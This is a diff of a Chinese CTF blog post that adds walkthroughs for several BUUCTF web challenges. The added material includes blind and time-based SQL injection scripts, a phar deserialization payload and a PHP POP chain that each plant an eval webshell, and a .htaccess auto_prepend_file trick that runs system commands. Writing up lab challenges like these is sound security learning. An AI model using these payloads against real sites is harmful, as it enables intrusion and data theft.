@@ -1,8 +1,8 @@
 ---
 title: "BUUCTF Web Writeup 8"
-date: 2022-11-12T09:43:01+08:00
-lastmod: 2022-11-12T09:43:01+08:00
-draft: true
+date: 2022-11-24T17:00:01+08:00
+lastmod: 2022-11-24T17:00:01+08:00
+draft: false
 author: "X1r0z"
 
 tags: ['ctf']
@@ -954,7 +954,7 @@ module.exports = router;
 
 keyword 的绕过用到 nodejs 的大小写特性
 
-```
+```javascript
 "ı".toUpperCase() == 'I'
 ```
 
@@ -1002,7 +1002,7 @@ if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
 only localhost can get flag!
 ```
 
-这道题思路也挺好的, 卡了好久...
+这道题思路挺好的, 卡了好久...
 
 首先通过 call\_user\_func 结合 `$_POST` 参数可以用 extract 变量覆盖
 
@@ -1264,3 +1264,508 @@ http://506b995f-192c-4444-b540-0908e8922e84.node4.buuoj.cn:81/user/user.php?id=1
 ```
 
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231238168.png)
+
+## [RoarCTF 2019]Online Proxy
+
+题目有点恶心, 感觉还是看源码会清楚一点...
+
+```php
+$last_ip = "";
+$result = query("select current_ip, last_ip from ip_log where uuid = '".addslashes($uuid)."'");
+if(count($result) > 0) {
+    if($ip !== $result[0]['current_ip']) {
+        $last_ip = $result[0]['current_ip'];
+
+        query("delete from ip_log where uuid='".addslashes($uuid)."'");
+    } else {
+        $last_ip = $result[0]['last_ip'];
+    }
+}
+
+query("insert into ip_log values ('".addslashes($uuid)."', '".addslashes($ip)."', '$last_ip');");
+
+die("\n<!-- Debug Info: \n Duration: $time s \n Current Ip: $ip ".($last_ip !== "" ? "\nLast Ip: ".$last_ip : "")." -->");
+```
+
+第一次访问得到 current\_ip 并插入数据库, 第二次更改 xff 头访问会将之前的 current\_ip 作为 last\_ip, 然后将 last\_ip 无过滤拼接到 sql 语句, 之后再访问的时候就直接从查询结果中取出 last\_ip 并输出
+
+思路就是第一次构造 xff 头 sql 注入, 第二次更改 ip 访问让 sql 注入的结果插入到数据库, 第三次保持之前的 ip 访问, 网站就会把结果返回出来
+
+脚本如下
+
+```python
+import requests
+import time
+
+url = 'http://node4.buuoj.cn:26194'
+
+flag = ''
+
+i = 1
+
+cookies = {'track_uuid': 'd9d157df-93ca-47a1-f438-f851d5ae0249'}
+
+while True:
+
+    min = 32
+    max = 127
+
+    while min < max:
+        time.sleep(0.02)
+        mid = (min + max) // 2
+        print(chr(mid))
+
+        payload = '1 \' and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e), {},1))>{}, 1, 0) and \'1\'=\'1'.format(i, mid)
+        res1 = requests.get(url, headers={'X-Forwarded-For': payload}, cookies=cookies)
+        res2 = requests.get(url, headers={'X-Forwarded-For': 'aa'}, cookies=cookies)
+        res3 = requests.get(url, headers={'X-Forwarded-For': 'aa'}, cookies=cookies)
+        if 'Last Ip: 1' in res3.text:
+            min = mid + 1
+        else:
+            max = mid
+    flag += chr(min)
+    i += 1
+    print('found', flag)
+```
+
+注意保持 cookie 相同
+
+## [GXYCTF2019]BabysqliV3.0
+
+其实是 phar 反序列化的题
+
+登录框输入 admin / password (弱口令), 然后主页 url 格式如下
+
+```
+http://f1d213e6-b05b-41aa-a5a9-4d06f76033a9.node4.buuoj.cn:81/home.php?file=upload
+```
+
+猜测存在文件包含, 于是利用 php filter 读取 upload.php
+
+```php
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+
+<form action="" method="post" enctype="multipart/form-data">
+	上传文件
+	<input type="file" name="file" />
+	<input type="submit" name="submit" value="上传" />
+</form>
+
+<?php
+error_reporting(0);
+class Uploader{
+	public $Filename;
+	public $cmd;
+	public $token;
+	
+
+	function __construct(){
+		$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
+		$ext = ".txt";
+		@mkdir($sandbox, 0777, true);
+		if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
+			$this->Filename = $_GET['name'];
+		}
+		else{
+			$this->Filename = $sandbox.$_SESSION['user'].$ext;
+		}
+
+		$this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
+		$this->token = $_SESSION['user'];
+	}
+
+	function upload($file){
+		global $sandbox;
+		global $ext;
+
+		if(preg_match("[^a-z0-9]", $this->Filename)){
+			$this->cmd = "die('illegal filename!');";
+		}
+		else{
+			if($file['size'] > 1024){
+				$this->cmd = "die('you are too big (′▽`〃)');";
+			}
+			else{
+				$this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
+			}
+		}
+	}
+
+	function __toString(){
+		global $sandbox;
+		global $ext;
+		// return $sandbox.$this->Filename.$ext;
+		return $this->Filename;
+	}
+
+	function __destruct(){
+		if($this->token != $_SESSION['user']){
+			$this->cmd = "die('check token falied!');";
+		}
+		eval($this->cmd);
+	}
+}
+
+if(isset($_FILES['file'])) {
+	$uploader = new Uploader();
+	$uploader->upload($_FILES["file"]);
+	if(@file_get_contents($uploader)){
+		echo "下面是你上传的文件：<br>".$uploader."<br>";
+		echo file_get_contents($uploader);
+	}
+}
+
+?>
+```
+
+简单反序列化, payload 如下
+
+```php
+<?php
+
+class Uploader{
+    public $Filename;
+    public $cmd;
+    public $token;
+}
+
+$a = new Uploader();
+$a->cmd='eval($_REQUEST[1]);phpinfo();';
+$a->token = 0;
+
+$phar =new Phar("phar.phar"); 
+$phar->startBuffering();
+$phar->setStub("GIF89A<?php XXX __HALT_COMPILER(); ?>");
+$phar->setMetadata($a);
+$phar->addFromString("test.txt", "test");
+$phar->stopBuffering();
+?>
+```
+
+上传两次, 第二次 get 传参 name 为 phar 协议来触发反序列化
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241303232.png)
+
+## [EIS 2019]EzPOP
+
+index.php
+
+```php
+<?php
+
+class A {
+
+    protected $store;
+
+    protected $key;
+
+    protected $expire;
+
+    public function __construct($store, $key = 'flysystem', $expire = null) {
+        $this->key = $key;
+        $this->store = $store;
+        $this->expire = $expire;
+    }
+
+    public function cleanContents(array $contents) {
+        $cachedProperties = array_flip([
+            'path', 'dirname', 'basename', 'extension', 'filename',
+            'size', 'mimetype', 'visibility', 'timestamp', 'type',
+        ]);
+
+        foreach ($contents as $path => $object) {
+            if (is_array($object)) {
+                $contents[$path] = array_intersect_key($object, $cachedProperties);
+            }
+        }
+
+        return $contents;
+    }
+
+    public function getForStorage() {
+        $cleaned = $this->cleanContents($this->cache);
+
+        return json_encode([$cleaned, $this->complete]);
+    }
+
+    public function save() {
+        $contents = $this->getForStorage();
+
+        $this->store->set($this->key, $contents, $this->expire);
+    }
+
+    public function __destruct() {
+        if (!$this->autosave) {
+            $this->save();
+        }
+    }
+}
+
+class B {
+
+    protected function getExpireTime($expire): int {
+        return (int) $expire;
+    }
+
+    public function getCacheKey(string $name): string {
+        return $this->options['prefix'] . $name;
+    }
+
+    protected function serialize($data): string {
+        if (is_numeric($data)) {
+            return (string) $data;
+        }
+
+        $serialize = $this->options['serialize'];
+
+        return $serialize($data);
+    }
+
+    public function set($name, $value, $expire = null): bool{
+        $this->writeTimes++;
+
+        if (is_null($expire)) {
+            $expire = $this->options['expire'];
+        }
+
+        $expire = $this->getExpireTime($expire);
+        $filename = $this->getCacheKey($name);
+
+        $dir = dirname($filename);
+
+        if (!is_dir($dir)) {
+            try {
+                mkdir($dir, 0755, true);
+            } catch (\Exception $e) {
+                // 创建失败
+            }
+        }
+
+        $data = $this->serialize($value);
+
+        if ($this->options['data_compress'] && function_exists('gzcompress')) {
+            //数据压缩
+            $data = gzcompress($data, 3);
+        }
+
+        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
+        echo $data;
+        $result = file_put_contents($filename, $data);
+
+        if ($result) {
+            return true;
+        }
+
+        return false;
+    }
+
+}
+
+if (isset($_GET['src']))
+{
+    highlight_file(__FILE__);
+}
+
+$dir = "uploads/";
+
+if (!is_dir($dir))
+{
+    mkdir($dir);
+}
+unserialize($_GET["data"]);
+```
+
+简单反序列化, 代码有点复杂, 不过从 \_\_destruct 往前一步一步看就能弄明白了
+
+主要考点是利用 php filter 去除开头的 `<?php exit();?>` 脏字符, 以 base64 为例
+
+```php
+<?php
+
+class A {
+
+    protected $store;
+    protected $key;
+    protected $expire;
+
+    public function __construct($store, $key, $expire){
+        $this->store = $store;
+        $this->key = $key;
+        $this->expire = $expire;
+    }
+}
+
+class B {
+    public $options;
+}
+
+$b = new B();
+$b->options = array(
+    "prefix" => 'php://filter/write=convert.base64-decode/resource=',
+    "serialize" => 'strval'
+    );
+
+$a = new A($b, '123.php', '456');
+
+$a->autosave = False;
+$a->cache = [];
+$a->complete = "aaaPD9waHAgZXZhbCgkX1JFUVVFU1RbMTIzNF0pOz8+";
+
+echo urlencode(serialize($a));
+```
+
+开头加三个 aaa 是为了凑出来 4 bytes
+
+```
+http://616b4e74-f26c-4f6f-b466-dc88612c52e1.node4.buuoj.cn:81/?data=O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A2%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A50%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D%22%3Bs%3A9%3A%22serialize%22%3Bs%3A6%3A%22strval%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A7%3A%22123.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bs%3A3%3A%22456%22%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22complete%22%3Bs%3A43%3A%22aaaPD9waHAgZXZhbCgkX1JFUVVFU1RbMTIzNF0pOz8%2B%22%3B%7D
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241416338.png)
+
+## [羊城杯2020]easyphp
+
+```php
+<?php
+    $files = scandir('./'); 
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== "index.php") {
+                unlink($file);
+            }
+        }
+    }
+    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
+        highlight_file(__FILE__);
+        die();
+    }
+    $content = $_GET['content'];
+    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
+        echo "Hacker";
+        die();
+    }
+    $filename = $_GET['filename'];
+    if(preg_match("/[^a-z\.]/", $filename) == 1) {
+        echo "Hacker";
+        die();
+    }
+    $files = scandir('./'); 
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== "index.php") {
+                unlink($file);
+            }
+        }
+    }
+    file_put_contents($filename, $content . "\nHello, world");
+?>
+```
+
+只有 index.php 能够被解析, 猜测是利用 .htaccess 的 php\_value 属性设置 auto\_prepend\_file
+
+参考文章 [https://blog.csdn.net/solitudi/article/details/116666720](https://blog.csdn.net/solitudi/article/details/116666720)
+
+file 被过滤了, 并且 content 后面会加入脏字符, 可以通过 `\` 来转义
+
+```
+php_value auto_prepend_fi\
+le .htaccess
+#<?php system('cat /fla?');?>\
+```
+
+```
+http://b63dd291-7b33-432f-a92d-b3bf76db2f08.node4.buuoj.cn:81/?filename=.htaccess&content=php_value+auto_prepend_fi\%0ale+.htaccess%0a%23<?php+system('cat /fla?');?>\
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241500537.png)
+
+## [SUCTF 2018]annonymous
+
+```php
+<?php
+
+$MY = create_function("","die(`cat flag.php`);");
+$hash = bin2hex(openssl_random_pseudo_bytes(32));
+eval("function SUCTF_$hash(){"
+    ."global \$MY;"
+    ."\$MY();"
+    ."}");
+if(isset($_GET['func_name'])){
+    $_GET["func_name"]();
+    die();
+}
+show_source(__FILE__);
+```
+
+题目来源于 hitcon 2017
+
+[https://lorexxar.cn/2017/11/10/hitcon2017-writeup/](https://lorexxar.cn/2017/11/10/hitcon2017-writeup/)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241532642.png)
+
+大意是说通过 create\_function 创建的匿名函数其实是有名字的, 函数名为 `\x00lambda_%d`, `%d` 为数字, 依次递增
+
+那么就可以通过 intruder 来爆破出这个数字
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241535044.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241535656.png)
+
+## [SWPU2019]Web4
+
+登录框存在 sql 注入
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241653148.png)
+
+测试发现过滤了一些关键字, select 也被过滤了... 看了 wp 才发现是堆叠注入
+
+堆叠注入可以用预编译绕过关键字过滤
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241654519.png)
+
+python 脚本
+
+```python
+import requests
+import time
+import json
+
+dicts = r'{}_,.-0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz'
+
+flag = ''
+
+for i in range(1, 99999):
+    for s in dicts:
+        time.sleep(0.04)
+        sql = 'select if(ascii(substr((select group_concat(flag) from flag),{},1))={}, sleep(2), 0)'.format(i, ord(s))
+        payload = '\';prepare st from 0x{};execute st;'.format(''.join(map(lambda x: str(hex(ord(x))).replace('0x', ''), sql)))
+        url = 'http://697bc918-3a4e-4630-b242-d992863b5859.node4.buuoj.cn:81/index.php?r=Login/Login'
+        a = time.time()
+        print(s)
+        res = requests.post(url, data=json.dumps({
+            'username': payload,
+            'password': '123'
+            }))
+        b = time.time()
+        if b -a >= 2:
+            flag += s
+            print('FOUND!!!',flag)
+            break
+```
+
+跑出来是 `glzjin_wants_a_girl_friend.zip` , 于是下载该压缩包
+
+网站是自己写的 mvc, 刚开始看没啥头绪, 然后看到了 extract
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241656330.png)
+
+变量覆盖, 但是 viewPath 这里是类的属性, 覆盖不了, 只能往加载的模板 userIndex 里再看看
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241657054.png)
+
+发现变量 `$img_file`, 可以读取文件, 遂改成 `/../flag.php`
+
+```
+http://697bc918-3a4e-4630-b242-d992863b5859.node4.buuoj.cn:81/index.php?r=User/Index&img_file=/../flag.php
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241658142.png)
